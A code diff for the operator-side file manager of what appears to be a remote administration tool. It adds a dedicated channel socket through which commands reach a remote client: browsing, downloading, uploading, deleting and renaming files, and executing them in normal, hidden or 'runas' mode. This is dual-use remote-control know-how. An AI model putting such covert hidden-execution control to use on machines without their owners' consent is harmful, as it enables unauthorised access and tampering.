@@ -67,6 +67,8 @@ type
     procedure SearchBox1Change(Sender: TObject);
   private
     FLine: TncLine;
+    FChannelLine: TncLine;
+    function GetActiveLine: TncLine;
     FClientID: string;
     FOnSendJSON: TSendJSONProc;
     FOnSendBinary: TSendBinaryProc;
@@ -82,6 +84,7 @@ type
     procedure ApplyLocalFilter;
     procedure Timer1Timer(Sender: TObject);
   public
+    procedure SetChannelLine(aChanLine: TncLine);
     procedure SetupForClient(aLine: TncLine; const aClientID: string;
       aSendJSONProc: TSendJSONProc; aSendBinaryProc: TSendBinaryProc; aUnregisterProc: TUnregisterFormProc);
     procedure HandleFileManagerJSON(JSONObj: TJSONObject);
@@ -185,10 +188,25 @@ begin
   TncLineAccess(aLine).SendBuffer(SendBuf[0], Length(SendBuf));
 end;
 
+function TForm9.GetActiveLine: TncLine;
+begin
+  if Assigned(FChannelLine) then
+    Result := FChannelLine
+  else
+    Result := FLine;
+end;
+
+procedure TForm9.SetChannelLine(aChanLine: TncLine);
+begin
+  FChannelLine := aChanLine;
+  LogToStatus('Dedicated channel socket attached.');
+end;
+
 procedure TForm9.SetupForClient(aLine: TncLine; const aClientID: string;
   aSendJSONProc: TSendJSONProc; aSendBinaryProc: TSendBinaryProc; aUnregisterProc: TUnregisterFormProc);
 begin
   FLine := aLine;
+  FChannelLine := nil;
   FClientID := aClientID;
   FOnSendJSON := aSendJSONProc;
   FOnSendBinary := aSendBinaryProc;
@@ -440,6 +458,15 @@ end;
 
 procedure TForm9.FormClose(Sender: TObject; var Action: TCloseAction);
 begin
+  if Assigned(FChannelLine) then
+  begin
+    try
+      FChannelLine.Disconnect;
+    except
+    end;
+    FChannelLine := nil;
+  end;
+
   if Assigned(FOnUnregister) and Assigned(FLine) then
     FOnUnregister(FLine);
 
@@ -463,12 +490,12 @@ procedure TForm9.RequestDrives;
 var
   JSONObj: TJSONObject;
 begin
-  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if not Assigned(FOnSendJSON) or not Assigned(GetActiveLine) then Exit;
 
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'getdrives');
-    FOnSendJSON(FLine, JSONObj);
+    FOnSendJSON(GetActiveLine, JSONObj);
   finally
     JSONObj.Free;
   end;
@@ -478,13 +505,13 @@ procedure TForm9.RequestDirectory(const Path: string);
 var
   JSONObj: TJSONObject;
 begin
-  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if not Assigned(FOnSendJSON) or not Assigned(GetActiveLine) then Exit;
 
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'getfiles');
     JSONObj.AddPair('path', Path);
-    FOnSendJSON(FLine, JSONObj);
+    FOnSendJSON(GetActiveLine, JSONObj);
   finally
     JSONObj.Free;
   end;
@@ -772,12 +799,12 @@ procedure TForm9.Copy1Click(Sender: TObject);
 var
   JSONObj: TJSONObject;
 begin
-  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(GetActiveLine) then Exit;
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'copyfile');
     JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
-    FOnSendJSON(FLine, JSONObj);
+    FOnSendJSON(GetActiveLine, JSONObj);
     LogToStatus('Copied to clipboard');
   finally
     JSONObj.Free;
@@ -788,14 +815,14 @@ procedure TForm9.Delete1Click(Sender: TObject);
 var
   JSONObj: TJSONObject;
 begin
-  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(GetActiveLine) then Exit;
   if MessageDlg('Are you sure you want to delete this?', mtConfirmation, [mbYes, mbNo], 0) <> mrYes then Exit;
 
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'deletefile');
     JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
-    FOnSendJSON(FLine, JSONObj);
+    FOnSendJSON(GetActiveLine, JSONObj);
     LogToStatus('Deleting: ' + ListView1.Selected.Caption + '...');
   finally
     JSONObj.Free;
@@ -806,13 +833,13 @@ procedure TForm9.Download1Click(Sender: TObject);
 var
   JSONObj: TJSONObject;
 begin
-  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(GetActiveLine) then Exit;
 
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'downloadfile');
     JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
-    FOnSendJSON(FLine, JSONObj);
+    FOnSendJSON(GetActiveLine, JSONObj);
     LogToStatus('Downloading: ' + ListView1.Selected.Caption + '...');
   finally
     JSONObj.Free;
@@ -823,7 +850,7 @@ var
   JSONObj: TJSONObject;
   FolderName: string;
 begin
-  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if not Assigned(FOnSendJSON) or not Assigned(GetActiveLine) then Exit;
   FolderName := InputBox('New Folder', 'Enter folder name:', 'New Folder');
   if FolderName = '' then Exit;
 
@@ -831,7 +858,7 @@ begin
   try
     JSONObj.AddPair('action', 'createfolder');
     JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + FolderName);
-    FOnSendJSON(FLine, JSONObj);
+    FOnSendJSON(GetActiveLine, JSONObj);
     LogToStatus('Creating folder...');
   finally
     JSONObj.Free;
@@ -842,13 +869,13 @@ procedure TForm9.Normal1Click(Sender: TObject);
 var
   JSONObj: TJSONObject;
 begin
-  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(GetActiveLine) then Exit;
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'execute');
     JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
     JSONObj.AddPair('mode', 'normal');
-    FOnSendJSON(FLine, JSONObj);
+    FOnSendJSON(GetActiveLine, JSONObj);
     LogToStatus('Executing: ' + ListView1.Selected.Caption);
   finally
     JSONObj.Free;
@@ -859,13 +886,13 @@ procedure TForm9.Normal2Click(Sender: TObject);
 var
   JSONObj: TJSONObject;
 begin
-  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(GetActiveLine) then Exit;
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'execute');
     JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
     JSONObj.AddPair('mode', 'hidden');
-    FOnSendJSON(FLine, JSONObj);
+    FOnSendJSON(GetActiveLine, JSONObj);
     LogToStatus('Executing (Hidden): ' + ListView1.Selected.Caption);
   finally
     JSONObj.Free;
@@ -876,12 +903,12 @@ procedure TForm9.Paste1Click(Sender: TObject);
 var
   JSONObj: TJSONObject;
 begin
-  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if not Assigned(FOnSendJSON) or not Assigned(GetActiveLine) then Exit;
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'pastefile');
     JSONObj.AddPair('path', FCurrentPath);
-    FOnSendJSON(FLine, JSONObj);
+    FOnSendJSON(GetActiveLine, JSONObj);
     LogToStatus('Pasting file...');
   finally
     JSONObj.Free;
@@ -893,7 +920,7 @@ var
   JSONObj: TJSONObject;
   NewName: string;
 begin
-  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(GetActiveLine) then Exit;
   NewName := InputBox('Rename', 'Enter new name:', ListView1.Selected.Caption);
   if (NewName = '') or (NewName = ListView1.Selected.Caption) then Exit;
 
@@ -902,7 +929,7 @@ begin
     JSONObj.AddPair('action', 'rename');
     JSONObj.AddPair('oldpath', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
     JSONObj.AddPair('newpath', IncludeTrailingPathDelimiter(FCurrentPath) + NewName);
-    FOnSendJSON(FLine, JSONObj);
+    FOnSendJSON(GetActiveLine, JSONObj);
     LogToStatus('Renaming: ' + ListView1.Selected.Caption + '...');
   finally
     JSONObj.Free;
@@ -913,13 +940,13 @@ procedure TForm9.RunAs1Click(Sender: TObject);
 var
   JSONObj: TJSONObject;
 begin
-  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(GetActiveLine) then Exit;
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'execute');
     JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
     JSONObj.AddPair('mode', 'runas');
-    FOnSendJSON(FLine, JSONObj);
+    FOnSendJSON(GetActiveLine, JSONObj);
     LogToStatus('Executing (RunAs): ' + ListView1.Selected.Caption);
   finally
     JSONObj.Free;
@@ -935,7 +962,7 @@ var
   SourceSize: Int64;
   LLine: TncLine;
 begin
-  if not Assigned(FLine) then Exit;
+  if not Assigned(GetActiveLine) then Exit;
 
   OpenDlg := TOpenDialog.Create(nil);
   try
@@ -951,7 +978,7 @@ begin
 
       FileName := TPath.GetFileName(SourcePath);
       DestPath := IncludeTrailingPathDelimiter(FCurrentPath) + FileName;
-      LLine := FLine;
+      LLine := GetActiveLine;
       LogToStatus('Uploading: ' + FileName + '...');
 
       TThread.CreateAnonymousThread(
